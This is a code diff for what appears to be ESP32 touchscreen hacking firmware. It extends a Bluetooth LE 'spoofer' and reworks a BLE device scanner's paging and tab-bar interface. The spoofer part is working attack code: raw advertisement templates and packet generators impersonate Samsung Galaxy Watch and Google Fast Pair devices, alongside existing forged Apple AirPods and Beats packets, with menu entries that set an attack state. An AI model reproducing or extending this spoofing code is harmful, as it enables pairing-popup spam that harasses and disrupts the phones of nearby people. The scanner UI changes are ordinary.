@@ -83,6 +83,32 @@ int attack_state = 1;
 int device_choice = 0;
 int device_index = 0;
 
+// Samsung devices (15 bytes)
+struct WatchModel {
+  uint8_t value;
+  const char* name;
+};
+const WatchModel samsungModels[] = {
+  {0x01, "Galaxy Watch 4"},
+  {0x02, "Galaxy Watch 5"},
+  {0x03, "Galaxy Watch 6"}
+};
+const uint8_t samsungModelCount = 3;
+const uint8_t SAMSUNG_ADV_SIZE = 15;
+const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
+const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
+  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
+};
+
+// Google device (14 bytes, single model)
+const uint8_t GOOGLE_ADV_SIZE = 14;
+const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
+const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
+  0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
+  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
+  0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
+};
+
 const uint8_t DEVICES[][31] = {
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
@@ -103,11 +129,33 @@ const uint8_t DEVICES[][31] = {
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 };
 
+bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
+  if (modelIndex >= samsungModelCount) return false;
+  uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
+  memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
+  advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
+  advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
+  return true;
+}
+
+bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
+  uint8_t advDataRaw[GOOGLE_ADV_SIZE];
+  memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
+  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100);
+  advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
+  return true;
+}
+
 BLEAdvertisementData getAdvertismentData() {
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  if (device_choice == 0) {
+  if (device_choice == 0) { // Apple
     oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
+  } else if (device_choice == 1) { // Samsung
+    uint8_t samsungIndex = device_index;
+    generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
+  } else if (device_choice == 2) { // Google
+    generateGoogleAdvPacket(oAdvertisementData);
   }
 
   return oAdvertisementData;
@@ -187,6 +235,10 @@ void updateSpoofer() {
     case 15: tft.setCursor(x, y); tft.print("[ Beats StudioPro ]"); break;
     case 16: tft.setCursor(x, y); tft.print("[ Beats FitPro ]"); break;
     case 17: tft.setCursor(x, y); tft.print("[ Beats BudsPlus ]"); break;
+    case 18: tft.setCursor(x, y); tft.print("[ Galaxy Watch 4 ]"); break;
+    case 19: tft.setCursor(x, y); tft.print("[ Galaxy Watch 5 ]"); break;
+    case 20: tft.setCursor(x, y); tft.print("[ Galaxy Watch 6 ]"); break;
+    case 21: tft.setCursor(x, y); tft.print("[ Google Smart Ctrl ]"); break;
     default: tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
   }
 
@@ -305,6 +357,31 @@ void Beats_Studio_Buds_Plus() {
   attack_state = 1;
 }
 
+// Android devices
+void Galaxy_Watch_4() {
+  device_choice = 1; // Samsung
+  device_index = 0;
+  attack_state = 1;
+}
+
+void Galaxy_Watch_5() {
+  device_choice = 1; // Samsung
+  device_index = 1;
+  attack_state = 1;
+}
+
+void Galaxy_Watch_6() {
+  device_choice = 1; // Samsung
+  device_index = 2;
+  attack_state = 1;
+}
+
+void Google_Smart_Ctrl() {
+  device_choice = 2; // Google
+  device_index = 0;
+  attack_state = 1;
+}
+
 void setAdvertisingData() {
 
   switch (deviceType) {
@@ -359,6 +436,18 @@ void setAdvertisingData() {
     case 17:
       Beats_Studio_Buds_Plus();
       break;
+    case 18:
+      Galaxy_Watch_4();
+      break;
+    case 19:
+      Galaxy_Watch_5();
+      break;
+    case 20:
+      Galaxy_Watch_6();
+      break;
+    case 21:
+      Google_Smart_Ctrl();
+      break;
     default:
       Airpods();
       break;
@@ -388,7 +477,7 @@ void handleButtonPress(int pin, void (*callback)()) {
 
 void changeDeviceTypeNext() {
   deviceType++;
-  if (deviceType > 17) deviceType = 1;
+  if (deviceType > 21) deviceType = 1;
   Serial.println("Device Type Next: " + String(deviceType));
   setAdvertisingData();
   updateSpoofer();
@@ -396,7 +485,7 @@ void changeDeviceTypeNext() {
 
 void changeDeviceTypePrev() {
   deviceType--;
-  if (deviceType < 1) deviceType = 17;
+  if (deviceType < 1) deviceType = 21;
   Serial.println("Device Type Prev: " + String(deviceType));
   setAdvertisingData();
   updateSpoofer();
@@ -537,6 +626,7 @@ void spooferSetup() {
   tft.fillScreen(TFT_BLACK);
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
+  randomSeed(analogRead(0));
   setupTouchscreen();
 
   tft.setTextFont(1);
@@ -1109,18 +1199,41 @@ int listStartIndex = 0;
 bool screenNeedsUpdate = true;
 bool fullScreenUpdate = true;
 
-int yshift = 30;
+static constexpr int yshift = 30;
+
+// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of tab bar (y=304..320)
+static constexpr int DEVICES_PER_PAGE = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+static int current_page = 0;
 
 unsigned long lastButtonPress = 0;
 const unsigned long debounceTime = 200;
 
 static bool uiDrawn = false;
 
-static int iconX[ICON_NUM] = {210, 10};
+static int iconX[ICON_NUM] = {220, 10};
 static const unsigned char* icons[ICON_NUM] = {
   bitmap_icon_undo,
   bitmap_icon_go_back
 };
+
+static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+static void drawTabBar(const char* leftButton, bool leftDisabled,
+                       const char* prevButton, bool prevDisabled,
+                       const char* nextButton, bool nextDisabled) {
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+  if (leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
+  if (prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+  if (nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+}
 
 static TaskHandle_t bgBleScanTaskHandle = nullptr;
 static volatile bool bgHasResults = false;
@@ -1163,9 +1276,10 @@ static void bgBleScanTask(void* ) {
 
 void displayScanning() {
   tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setCursor(10, 15 + yshift);
-  tft.print("[*] Scanning");
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN);
+  tft.setCursor(10, LIST_HEADER_Y);
+  tft.println("Scanning...");
 
   for (int i = 0; i < 2; i++) {
     for (int j = 0; j <= i; j++) {
@@ -1173,18 +1287,18 @@ void displayScanning() {
       delay(500);
     }
   }
-  tft.setCursor(10, 25 + yshift);
-  tft.print("[+] Scan complete!");
-
+  tft.setCursor(10, LIST_HEADER_Y + 15);
+  tft.println("Wait a moment.");
   delay(100);
-
-  tft.setCursor(10, 45 + yshift);
-  tft.print("[+] Wait a moment");
   isScanning = false;
 }
 
 void startBLEScan() {
   displayScanning();
+  isDetailView = false;
+  current_page = 0;
+  currentIndex = 0;
+  listStartIndex = 0;
   isScanning = true;
   screenNeedsUpdate = true;
   fullScreenUpdate = true;
@@ -1203,13 +1317,16 @@ void handleButtons() {
   unsigned long currentMillis = millis();
   if (currentMillis - lastButtonPress < debounceTime) return;
 
+  int oldPage = current_page;
+
   if (!pcf.digitalRead(BTN_UP)) {
     if (!isDetailView && currentIndex > 0) {
       currentIndex--;
       delay(200);
-      if (currentIndex < listStartIndex) listStartIndex--;
+      current_page = currentIndex / max(1, DEVICES_PER_PAGE);
+      listStartIndex = current_page * DEVICES_PER_PAGE;
       screenNeedsUpdate = true;
-      fullScreenUpdate = false;
+      fullScreenUpdate = (current_page != oldPage);
     }
     lastButtonPress = currentMillis;
   }
@@ -1218,9 +1335,10 @@ void handleButtons() {
     if (!isDetailView && currentIndex < bleResults.getCount() - 1) {
       currentIndex++;
       delay(200);
-      if (currentIndex >= listStartIndex + 14) listStartIndex++;
+      current_page = currentIndex / max(1, DEVICES_PER_PAGE);
+      listStartIndex = current_page * DEVICES_PER_PAGE;
       screenNeedsUpdate = true;
-      fullScreenUpdate = false;
+      fullScreenUpdate = (current_page != oldPage);
     }
     lastButtonPress = currentMillis;
   }
@@ -1250,53 +1368,96 @@ void handleButtons() {
 }
 
 void updateBLEList() {
-  if (fullScreenUpdate) {
-    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-    tft.fillRect(35, 20, 105, 16, DARK_GRAY);
-    tft.setTextColor(TFT_WHITE);
-    tft.setCursor(35, 24);
-    tft.print("BLE Devices:");
-  }
-
   int deviceCount = bleResults.getCount();
+  tft.setTextSize(1);
+
   if (deviceCount <= 0) {
-    if (fullScreenUpdate) {
-      tft.fillRect(0, 20, 140, 16, DARK_GRAY);
-      tft.setTextColor(TFT_WHITE);
-      tft.setCursor(5, 24);
-      tft.print("No Devices Found");
-    }
+    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, LIST_HEADER_Y);
+    tft.println("No devices found.");
+    tft.setCursor(10, LIST_HEADER_Y + 12);
+    tft.println("Press Rescan.");
+    drawTabBar("Rescan", false, "Prev", true, "Next", true);
     return;
   }
 
-  for (int i = 0; i < 14; i++) {
-    int index = i + listStartIndex;
-    if (index >= deviceCount) break;
+  const int totalPages = (deviceCount + DEVICES_PER_PAGE - 1) / DEVICES_PER_PAGE;
+  if (current_page < 0) current_page = 0;
+  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
+  listStartIndex = current_page * DEVICES_PER_PAGE;
 
-    int yPos = 15 + i * 18;
-    tft.fillRect(0, yPos - 2 + yshift, tft.width(), 18, TFT_BLACK);
+  static int last_rendered_page = -1;
+  static int last_rendered_index = -1;
 
-    BLEAdvertisedDevice device = bleResults.getDevice(index);
-    String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
+  auto drawRow = [&](int idx, bool selected) {
+    if (idx < 0 || idx >= deviceCount) return;
+    if (idx < listStartIndex || idx >= listStartIndex + DEVICES_PER_PAGE) return;
+    const int row = idx - listStartIndex;
+    const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
 
-    tft.setCursor(10, yPos + yshift);
-    if (index == currentIndex) {
-      tft.setTextColor(ORANGE, TFT_BLACK);
-      tft.print("> " + deviceName);
-    } else {
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.print("  " + deviceName);
+    // Clear only this row (avoid overlapping next row).
+    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+    BLEAdvertisedDevice device = bleResults.getDevice(idx);
+    String name = device.getName().length() > 0 ? device.getName().c_str() : "Unknown";
+    if (name.length() > 22) name = name.substring(0, 22) + "...";
+
+    tft.setCursor(10, y);
+    tft.setTextColor(selected ? ORANGE : WHITE);
+    tft.print(selected ? "> " : "  ");
+    tft.println(name);
+  };
+
+  const bool pageChanged = (current_page != last_rendered_page);
+  const bool needFull = fullScreenUpdate || pageChanged || (last_rendered_index < 0);
+
+  if (needFull) {
+    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, LIST_HEADER_Y);
+    tft.println("Devices:");
+
+    char page_buf[20];
+    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
+    tft.setCursor(180, LIST_HEADER_Y);
+    tft.setTextColor(GREEN);
+    tft.println(page_buf);
+
+    const int end_index = min(listStartIndex + DEVICES_PER_PAGE, deviceCount);
+    for (int i = listStartIndex; i < end_index; i++) {
+      drawRow(i, (i == currentIndex));
     }
+
+    const bool prevDisabled = (current_page == 0);
+    const bool nextDisabled = ((current_page + 1) * DEVICES_PER_PAGE >= deviceCount);
+    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);
+
+    last_rendered_page = current_page;
+    last_rendered_index = currentIndex;
+    return;
+  }
+
+  if (last_rendered_index != currentIndex) {
+    drawRow(last_rendered_index, false);
+    drawRow(currentIndex, true);
+    last_rendered_index = currentIndex;
   }
 }
 
 void displayBLEDetails() {
 
   tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-  tft.fillRect(35, 20, 105, 16, DARK_GRAY);
-  tft.setTextColor(TFT_WHITE);
-  tft.setCursor(35, 24);
-  tft.print("Device Details:");
+  tft.setTextSize(1);
+
+  const int deviceCount = bleResults.getCount();
+  if (deviceCount <= 0) {
+    isDetailView = false;
+    screenNeedsUpdate = true;
+    fullScreenUpdate = true;
+    return;
+  }
+  if (currentIndex < 0) currentIndex = 0;
+  if (currentIndex >= deviceCount) currentIndex = deviceCount - 1;
 
   BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
   String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
@@ -1304,41 +1465,53 @@ void displayBLEDetails() {
   int rssi = device.getRSSI();
   int txPower = device.getTXPower();
 
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextColor(WHITE, TFT_BLACK);
   tft.setTextSize(1);
 
-  tft.setCursor(10, 20 + yshift);
+  int y = 50;
+  tft.setCursor(10, y);
   tft.print("Device: " + deviceName);
-  tft.setCursor(10, 40 + yshift);
+  y += 20;
+  tft.setCursor(10, y);
   tft.print("MAC: " + address);
-  tft.setCursor(10, 60 + yshift);
+  y += 20;
+  tft.setCursor(10, y);
   tft.print("RSSI: " + String(rssi) + " dBm");
-  tft.setCursor(10, 80 + yshift);
+  y += 20;
+  tft.setCursor(10, y);
   tft.print("Tx Power: " + String(txPower) + " dBm");
 
   if (device.haveServiceUUID()) {
-    tft.setCursor(10, 100 + yshift);
+    y += 20;
+    tft.setCursor(10, y);
     tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
   } else {
-    tft.setCursor(10, 100 + yshift);
+    y += 20;
+    tft.setCursor(10, y);
     tft.print("No Service UUID");
   }
   if (device.haveManufacturerData()) {
     String manufacturerData = String((char*)device.getManufacturerData().c_str());
-    tft.setCursor(10, 120 + yshift);
-    tft.print("Manufacturer Data: " + manufacturerData);
+    y += 20;
+    tft.setCursor(10, y);
+    tft.print("Manufacturer: " + manufacturerData);
   } else {
-    tft.setCursor(10, 120 + yshift);
+    y += 20;
+    tft.setCursor(10, y);
     tft.print("No Manufacturer Data");
   }
   if (device.haveServiceData()) {
     String serviceData = String((char*)device.getServiceData().c_str());
-    tft.setCursor(10, 150 + yshift);
+    y += 30;
+    tft.setCursor(10, y);
     tft.print("Service Data: " + serviceData);
   } else {
-    tft.setCursor(10, 150 + yshift);
+    y += 30;
+    tft.setCursor(10, y);
     tft.print("No Service Data");
   }
+
+  drawTabBar("Rescan", false, "", true, "Back", false);
 }
 
 void runUI() {
@@ -1346,8 +1519,8 @@ void runUI() {
   static int iconY = STATUS_BAR_Y_OFFSET;
 
   if (!uiDrawn) {
-    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
-    tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);
+    tft.drawLine(0, 19, 240, 19, WHITE);
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
 
     for (int i = 0; i < ICON_NUM; i++) {
       if (icons[i] != NULL) {
@@ -1385,11 +1558,17 @@ void runUI() {
   }
 
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;
+  const unsigned long touchCheckInterval = 120;
+  static uint32_t lastTouchActionMs = 0;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
   int x, y;
   if (feature_active && readTouchXY(x, y)) {
+      const uint32_t nowMs = millis();
+      if (nowMs - lastTouchActionMs < 250) {
+        lastTouchCheck = millis();
+        return;
+      }
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
@@ -1398,8 +1577,62 @@ void runUI() {
               animationState = 1;
               activeIcon = i;
               lastAnimationTime = millis();
+              lastTouchActionMs = nowMs;
             }
             break;
+          }
+        }
+      } else if (!isScanning) {
+        const int deviceCount = bleResults.getCount();
+
+        // Deauther-like bottom bar has a large touch hitbox.
+        if (y >= 290 && y <= 320) {
+          const bool prevDisabled = (current_page == 0);
+          const bool nextDisabled = ((current_page + 1) * DEVICES_PER_PAGE >= deviceCount);
+
+          if (x >= 0 && x <= 57) {
+            drawButton(0, 304, 57, 16, "Rescan", true, false);
+            delay(50);
+            startBLEScan();
+            lastTouchActionMs = nowMs;
+          } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
+            drawButton(117, 304, 57, 16, "Prev", true, false);
+            current_page--;
+            if (current_page < 0) current_page = 0;
+            currentIndex = current_page * DEVICES_PER_PAGE;
+            listStartIndex = current_page * DEVICES_PER_PAGE;
+            screenNeedsUpdate = true;
+            fullScreenUpdate = true;
+            lastTouchActionMs = nowMs;
+          } else if (x >= 177 && x <= 240) {
+            if (isDetailView) {
+              drawButton(177, 304, 57, 16, "Back", true, false);
+              isDetailView = false;
+              screenNeedsUpdate = true;
+              fullScreenUpdate = true;
+              lastTouchActionMs = nowMs;
+            } else if (!nextDisabled) {
+              drawButton(177, 304, 57, 16, "Next", true, false);
+              current_page++;
+              currentIndex = current_page * DEVICES_PER_PAGE;
+              listStartIndex = current_page * DEVICES_PER_PAGE;
+              screenNeedsUpdate = true;
+              fullScreenUpdate = true;
+              lastTouchActionMs = nowMs;
+            }
+          }
+        } else if (!isDetailView) {
+          const int listMaxY = LIST_FIRST_ROW_Y + (DEVICES_PER_PAGE * LIST_ROW_H);
+          if (deviceCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
+            const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+            const int idx = (current_page * DEVICES_PER_PAGE) + row;
+            if (idx >= 0 && idx < deviceCount) {
+              currentIndex = idx;
+              isDetailView = true;
+              screenNeedsUpdate = true;
+              fullScreenUpdate = true;
+              lastTouchActionMs = nowMs;
+            }
           }
         }
       }
@@ -1411,9 +1644,6 @@ void runUI() {
 void bleScanSetup() {
 
   tft.fillScreen(TFT_BLACK);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setTextSize(1);
-  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
 
   uiDrawn = false;
 
@@ -1431,6 +1661,10 @@ void bleScanSetup() {
   ensureBleInit();
 
   if (bgHasResults && bleResults.getCount() > 0) {
+    current_page = 0;
+    currentIndex = 0;
+    listStartIndex = 0;
+    isDetailView = false;
     screenNeedsUpdate = true;
     fullScreenUpdate = true;
     updateBLEList();
@@ -1446,7 +1680,7 @@ void bleScanLoop() {
     return;
   }
 
-  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+  tft.drawLine(0, 19, 240, 19, WHITE);
   handleButtons();
 
   runUI();
@@ -2438,7 +2672,7 @@ private:
     }
     displayLines[0].text = text;
     displayLines[0].color = color;
-    displayLines[0].originalColor = (type == MessageType::STATUS) ? DARK_GRAY : color;
+    displayLines[0].originalColor = (type == MessageType::STATUS) ? UI_DIM_TEXT : color;
     displayLines[0].isAlert = isAlert;
     displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
     displayLines[0].type = type;
